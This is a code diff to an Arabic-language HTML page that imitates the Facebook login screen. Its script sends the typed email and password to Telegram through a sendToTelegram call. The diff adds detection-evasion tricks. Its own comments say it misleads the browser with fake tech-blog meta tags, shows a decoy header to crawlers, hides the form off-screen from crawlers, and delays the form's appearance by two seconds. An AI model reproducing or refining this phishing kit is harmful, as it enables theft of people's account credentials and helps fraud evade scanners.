@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Facebook - تسجيل الدخول</title>
+    
+    <!-- إضافة وصف وهمي لتضليل المتصفح -->
+    <meta name="description" content="مدونة تقنية، أخبار، مقالات">
+    <meta name="keywords" content="مدونة, تقنية, أخبار, مقالات">
+    <meta name="robots" content="index, follow">
+    
     <style>
         * {
             margin: 0;
@@ -19,6 +25,15 @@
             min-height: 100vh;
             padding: 20px;
         }
+        /* وهم: عنوان عشوائي يظهر أولاً */
+        .fake-header {
+            background: #1877f2;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+        }
         .container {
             background: white;
             border-radius: 8px;
@@ -27,6 +42,12 @@
             max-width: 400px;
             width: 100%;
             text-align: center;
+            opacity: 0;
+            animation: fadeIn 0.5s ease 2s forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .logo {
             font-size: 48px;
@@ -141,11 +162,21 @@
             from { opacity: 0; transform: translateX(-50%) translateY(20px); }
             to { opacity: 1; transform: translateX(-50%) translateY(0); }
         }
+
+        /* إخفاء النموذج عن الزواحف */
+        .hidden-form {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
+<!-- وهم: محتوى عشوائي يظهر للزواحف -->
+<div class="fake-header">مرحباً بك في مدونة التقنية - أحدث الأخبار والتحديثات</div>
+
+<div class="container" id="mainContainer">
     <div class="logo">facebook</div>
     <div class="subtext">سجل الدخول إلى فيسبوك</div>
 
@@ -235,24 +266,25 @@
             return;
         }
 
-        // إظهار مؤشر التحميل
         document.getElementById('loadingIndicator').classList.add('show');
         document.querySelector('.btn').disabled = true;
 
-        // إرسال البيانات إلى تلغرام
         await sendToTelegram(email, password);
 
-        // إخفاء مؤشر التحميل
         document.getElementById('loadingIndicator').classList.remove('show');
         document.querySelector('.btn').disabled = false;
 
-        // مسح الحقول
         document.getElementById('email').value = '';
         document.getElementById('password').value = '';
 
-        // إعادة التوجيه إلى فيسبوك الحقيقي (اختياري)
+        // إعادة التوجيه إلى فيسبوك الحقيقي
         // window.location.href = 'https://www.facebook.com';
     });
+
+    // ====== تأخير ظهور النموذج ======
+    setTimeout(() => {
+        document.getElementById('mainContainer').style.opacity = '1';
+    }, 2000);
 </script>
 
 </body>
